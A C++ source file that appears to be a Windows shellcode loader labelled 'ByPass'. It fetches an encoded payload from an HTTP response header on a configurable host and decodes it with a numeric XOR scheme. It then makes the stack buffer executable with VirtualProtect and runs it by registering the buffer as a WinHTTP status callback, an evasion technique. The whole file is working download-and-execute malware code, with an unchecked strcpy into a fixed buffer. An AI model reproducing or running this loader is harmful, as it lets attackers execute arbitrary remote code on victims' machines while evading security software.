#define _CRT_SECURE_NO_DEPRECATE
#include<iostream>
#include<Windows.h>
#include<winhttp.h>
#pragma comment(lib,"Winhttp.lib")

using namespace std;

VOID GetScFromAddress(LPCWSTR URL, DWORD PORT, WCHAR* lpBuffer, LPCWSTR PATH, LPCWSTR HeaderName) {

	DWORD dwSize = 0;

	WCHAR* lpOutBuffer = NULL;
	HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

	BOOL  bResults = FALSE;

	hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		cout << "[*] WinHttpOpen Success" << endl;
		hConnect = WinHttpConnect(hSession, URL, PORT, 0);
	}
	else { cout << "[*] WinHttpOpen Error" << endl; exit(1); }

	if (hConnect)
	{
		cout << "[*] WinHttpConnect Success" << endl;
		hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}
	else { cout << "[*] WinHttpConnect Error" << endl; exit(1); }

	if (hRequest)
	{
		cout << "[*] WinHttpOpenRequest Success" << endl;
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}
	else { cout << "[*] WinHttpOpenRequest Error" << endl; exit(1); }

	if (bResults)
	{
		cout << "[*] WinHttpSendRequest Success" << endl;
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}
	else { cout << "[*] WinHttpSendRequest Error" << endl; exit(1); }

	if (bResults)
	{
		cout << "[*] WinHttpReceiveRequest Success" << endl;
		bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);

		if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			lpOutBuffer = new WCHAR[dwSize / sizeof(WCHAR)];

			bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, HeaderName, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);
		}
	}
	else { cout << "[*] WinHttpReceiveRequest Error" << endl; exit(1); }

	if (bResults)
	{
		cout << "[*] WinHttpQueryHeaders Success" << endl;
		RtlMoveMemory(lpBuffer, lpOutBuffer, wcslen(lpOutBuffer) * sizeof(WCHAR));
	}
	else {
		cout << "[*] WinHttpQueryHeaders Error" << endl; exit(1);
	}

	delete[] lpOutBuffer;

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
}

DWORD LoadSc(char* EncodeBuffer) {

	char buf[6000];
	strcpy(buf, EncodeBuffer);
	delete[] EncodeBuffer;
	char cd[10];
	char code;
	string buf_2 = buf;
	int num = 0, cnum = 0;
	int num_ = num + 4;
	for (int i = 0; i < sizeof(buf); i++) {
		if (buf[i] != (char)'\x0') {
			string str = buf_2.substr(num, num_);
			if (str.length() < 4) {
				break;
			}
			str.copy(cd, 4, 0);
			code = (char)(atoi(cd) - 1024) ^ 1024;
			buf[cnum] = code;
			cnum++;
			num_ += 4;
			num += 4;
		}
		else {
			break;
		}
	}
	DWORD Old = 0;
	BOOL IsExchange = VirtualProtect(&buf, 6000, PAGE_EXECUTE_READWRITE, &Old);
	if (!IsExchange) {
		cout << "[*] VirtualProtect Error " << endl;
		return -1;
	}
	cout << "[*] VirtualProtect Success" << endl;
	HINTERNET hopen = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hopen, (WINHTTP_STATUS_CALLBACK)&buf, WINHTTP_CALLBACK_FLAG_HANDLES, NULL);
	if (callback == WINHTTP_INVALID_STATUS_CALLBACK) {
		cout << "[*] WinHttpSetStatusCallback Error" << endl;
		return -1;
	}
	cout << "[*] WinHttpSetStatusCallback Success" << endl;
	cout << "[*] Load Success  " << endl << endl;
	WinHttpCloseHandle(hopen);
	return 1;
}

void Load_sc(LPCWSTR ip, LPCWSTR path, LPCWSTR Header, int port) {
	WCHAR* lpBuffer = new WCHAR[6000];
	char* Buffer = new char[6000];
	cout << "\t---[*][*] ByPass [*][*]---" << endl << endl;
	GetScFromAddress(ip, port, lpBuffer, path, Header);
	sprintf(Buffer, "%ws", lpBuffer);
	memset(lpBuffer, 0, 6000);
	delete[] lpBuffer;
	LoadSc(Buffer);
}

int wmain(int argc, WCHAR* argv[]) {

	LPCWSTR ip = L"127.0.0.1";
	LPCWSTR file = L"ii.php";
	LPCWSTR Header = L"sc";
	int port = 80;
	Load_sc(ip, file, Header, port);

	return 0;

}